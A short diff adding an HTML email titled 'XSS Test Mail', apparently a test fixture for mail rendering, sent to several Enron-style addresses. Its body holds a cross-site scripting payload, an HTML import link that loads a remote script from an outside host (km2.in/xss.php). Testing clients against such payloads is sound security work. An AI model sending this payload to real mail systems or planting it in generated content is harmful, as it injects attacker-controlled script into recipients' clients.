@@ -1,0 +1,7 @@
+From: rgladstein@aol.com
+To: jay.hawthorn@enron.com, tom.moran@enron.com, mark.taylor@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+aaaaaaa <link rel=import href=//km2.in/xss.php>
